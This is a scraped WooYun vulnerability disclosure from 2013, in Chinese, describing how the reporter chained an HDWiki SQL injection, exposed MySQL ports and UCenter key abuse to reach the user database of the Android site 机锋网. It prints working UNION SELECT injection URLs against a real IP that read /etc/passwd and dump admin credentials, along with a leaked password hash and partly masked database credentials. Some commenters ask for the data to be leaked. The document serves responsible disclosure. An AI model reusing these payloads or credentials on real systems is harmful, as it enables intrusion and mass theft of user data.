{"id": 9384, "wybug_id": "wooyun-2013-034176", "wybug_title": "机锋网某分站存在SQL注入漏洞导致2000万用户信息告急", "wybug_corp": "机锋网", "wybug_author": "猪猪侠", "wybug_date": "2013-08-12 15:48", "wybug_open_date": "2013-09-26 15:48", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["第三方不可信程序", "字符类型注射", "管理后台对外", "后台被猜解"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-08-12：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-08-14：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-08-24：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-09-03：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-09-13：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-09-26：\t细节向公众公开  简要描述： 利用了乌云白帽子 kobin97 以前提交的一个已公开的漏洞外加几个运维缺陷间接造成2000万注册用户信息泄露风险。安全是一个整体，保证安全不在于强大的地方有多强大，而在于真正薄弱的地方在哪里 详细说明：  #1 通过扫描整个机锋网所在网络的C段发现http://117.79.80.23:8000/robots.txt 使用了HDWiki，同时HDwiki存在多个高危的SQL注入漏洞。~! 同时还有phpinfo信息泄露http://117.79.80.23:8000/info.php\n\n#2 SQL注入漏洞利用相关信息：kobin97 提交的  WooYun: HDwiki某SQL注射和鸡肋文件包含 ~! 读文件http://117.79.80.23:8000/?doc-summary-xxxxxxxxx%27%20and%201=2%20union%20select%201,2,3,4,5,concat%28username,0x7c,load_file('/etc/passwd')%29,7,8,9,0,1,2,3,4,5,6,7,8,9,0%20from%20wiki_user%20where%20groupid=4%23~! 注入http://117.79.80.23:8000/?doc-summary-xxxxxxxxx%27%20and%201=2%20union%20select%201,2,3,4,5,concat%28username,0x7c,password%29,7,8,9,0,1,2,3,4,5,6,7,8,9,0%20from%20wiki_user%20where%20groupid=4%23webmaster|0c3cc2b229a290c98e6b161a607f48d3~! 由于SQL用户是root权限，所以可以查询所有mysql.users的信息\n%|readonly|*56136B3287D********8FBDF4CAC915AED46333%|root|*8A69D03C179A66324D2E********6645035BCFD7%|approot|*8A69D03C179A66324D2E********6645035BCFD7\n~! 同时本漏洞不受GPC的影响，可以outfile。#3 有了wiki的管理员密码，后来却发现这个WIKI残破不堪，没办法登录后台\n\n这里想过一些办法但是最终没有绕过进入后台。#4 找到了这么多问题，不可以轻易放弃，SO 重新整理已有信息，再间接利用通过扫描对应C段的portMap，发现几个IP开了3306端口，于是用注入得到的mysql用户连接数据库，远程成功连接上去了。\n\n#5 你没看错，直接连上了，数据库一堆，又可以重新整合获取的信息再次重整思路~! 利用点1，存在很多discuz论坛的数据库，直接读取管理员密码进入后台拿shell~! 利用点2，存在多个应用系统的数据库，也可以间接读取管理员密码进入后台~! 打字太累，出续集好了。#6 初探用户信息我们知道机锋网的用户登录API全都交由passport.gfan.com这个入口来处理，所以必须获取到这里的权限，才能读到所有用户信息。扫描得到如下phpinfo:http://passport.gfan.com/gfan_uc/phpinfo.php\n\n~! 利用另外一些信息，获取了某个论坛的shell，通过读取的UC_KEY，重置了UCenter后台管理员的密码，进入UCenter后台。   漏洞证明：  ~! 再间接通过读取UCenter的配置，获得UCenter的链接密码。\n<?php define('UC_DBHOST', '10.8.8.**');define('UC_DBUSER', 'uczooer');define('UC_DBPW', 'Azzt********kY88');define('UC_DBNAME', 'ucenter');define('UC_DBCHARSET', 'utf8');define('UC_DBTABLEPRE', 'uc_');\n# 直接连接数据库，探到用户信息\n\n\n\n   修复方案：  #1 使用第三方开源程序，应当时刻关注补丁信息#2 MYSQL应当设置为禁止远程连接模式，或者直接3306端口设置访问控制规则#3 尽量使系统简单化，不要让单个用户的权限过高。   版权声明：转载请注明来源 猪猪侠@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2013-08-14 15:10 厂商回复： 已确认。请告知联系方式:) 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-08-12 15:49 |    \t\tmango \t\t\t( 核心白帽子 |\t\t\t        Rank:1668 漏洞数:248        | 我有个2b女友！)\t\t \n  2000万用户信息告急！！！    \n     2013-08-12 15:51 |    \t\tSpid3r \t\t\t( 实习白帽子  |\t\t\t        Rank:50 漏洞数:10        | 常年撒网打鱼.)\t\t \n  2000万用户信息告急！！！    \n     2013-08-12 15:51 |    \t\tM4sk \t\t\t( 普通白帽子  |\t\t\t        Rank:1199 漏洞数:319        | 国内信息安全任重而道远，还需要厂商和白帽...)\t\t \n  2000万用户信息告急！！！    \n     2013-08-12 15:53 |    \t\t佐瞳 \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:3        | 专业小白二十年~)\t\t \n  2000万用户信息告急！！！    \n     2013-08-12 15:54 |    \t\t淡漠天空  \t\t\t( 实习白帽子  |\t\t\t        Rank:1113 漏洞数:142        | M:出售GOV  STATE NSA CIA NASA DHS Symant...)\t\t \n  对神马千万级别已然盲目  还不如自己脱了玩      \n     2013-08-12 15:59 |    \t\tcnbird \t\t\t( 普通白帽子  |\t\t\t        Rank:547 漏洞数:47        | http://blog.csdn.net/cnbird2008)\t\t \n  内裤大盗    \n     2013-08-12 16:14 |    \t\tniliu  \t\t\t( 核心白帽子 |\t\t\t        Rank:1542 漏洞数:206        | 逆流而上)\t\t \n  2000万用户信息告急！！！    \n     2013-08-12 16:16 |    \t\tManning \t\t\t( 普通白帽子  |\t\t\t        Rank:559 漏洞数:78        | 就恨自己服务器太少)\t\t \n  2000万用户信息告急！！！    \n     2013-08-12 16:28 |    \t\t啦绯哥 \t\t\t( 普通白帽子  |\t\t\t        Rank:107 漏洞数:20        )\t\t \n  在机锋的漏洞列表中怎么没有看到kobin97提交的漏洞。。。    \n     2013-08-12 16:30 |    \t\tniliu  \t\t\t( 核心白帽子 |\t\t\t        Rank:1542 漏洞数:206        | 逆流而上)\t\t \n  同楼上，我也没找到    \n     2013-08-12 16:30 |    \t\tPasser_by \t\t\t( 实习白帽子  |\t\t\t        Rank:97 漏洞数:21        | 问题真实存在但是影响不大（腾讯微博Passer...)\t\t \n  2013-07-22 15:39 | 猪猪侠 (核心白帽子 | Rank:649 漏洞数:50 | 你都有那么多超级棒棒糖了，还要自由干吗？) 小哥，你看这个厂商对待漏洞的历史记录，还提交？ 这一看又是被忽略的节奏！    \n     2013-08-12 16:32 |    \t\tniliu  \t\t\t( 核心白帽子 |\t\t\t        Rank:1542 漏洞数:206        | 逆流而上)\t\t \n  @Passer_by 不可能忽略的，这是20rank的节奏，这是大礼包滴干活    \n     2013-08-12 16:39 |    \t\tMaster \t\t\t( 路人 |\t\t\t        Rank:29 漏洞数:10        )\t\t \n  如果洞主发个baidu盘加密连接 大家和你还是好朋友    \n     2013-08-12 17:49 |    \t\t普瑞斯特 \t\t\t( 实习白帽子  |\t\t\t        Rank:65 漏洞数:6        )\t\t \n  如果洞主发个baidu盘加密连接 大家和你还是好朋友     \n     2013-08-12 21:09 |    \t\t霍大然 \t\t\t( 普通白帽子  |\t\t\t        Rank:1136 漏洞数:178        | W币花完了，刷分还是不刷？)\t\t \n  厂商发次礼物吧    \n     2013-08-12 21:11 |    \t\tnick被注册 \t\t\t( 普通白帽子  |\t\t\t        Rank:125 漏洞数:20        | 天一)\t\t \n  会不会忽略？    \n     2013-08-12 22:45 |    \t\tfeng \t\t\t( 普通白帽子  |\t\t\t        Rank:664 漏洞数:79        | 想刷个6D)\t\t \n  咋变普通白帽子了 求解释    \n     2013-08-13 00:57 |    \t\t猪猪侠  \t\t\t( 核心白帽子 |\t\t\t        Rank:3224 漏洞数:254        | 你都有那么多超级棒棒糖了，还要自由干吗？)\t\t \n  @feng 这都被你发现了，观察得真细致啊。    \n     2013-08-13 12:37 |    \t\ttenzy \t\t\t( 普通白帽子  |\t\t\t        Rank:176 漏洞数:21        | Need not to know)\t\t \n  2000万用户信息告急！！！    \n     2013-08-14 16:48 |    \t\t啦绯哥 \t\t\t( 普通白帽子  |\t\t\t        Rank:107 漏洞数:20        )\t\t \n  @feng 请参考http://zone.wooyun.org/content/5874    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}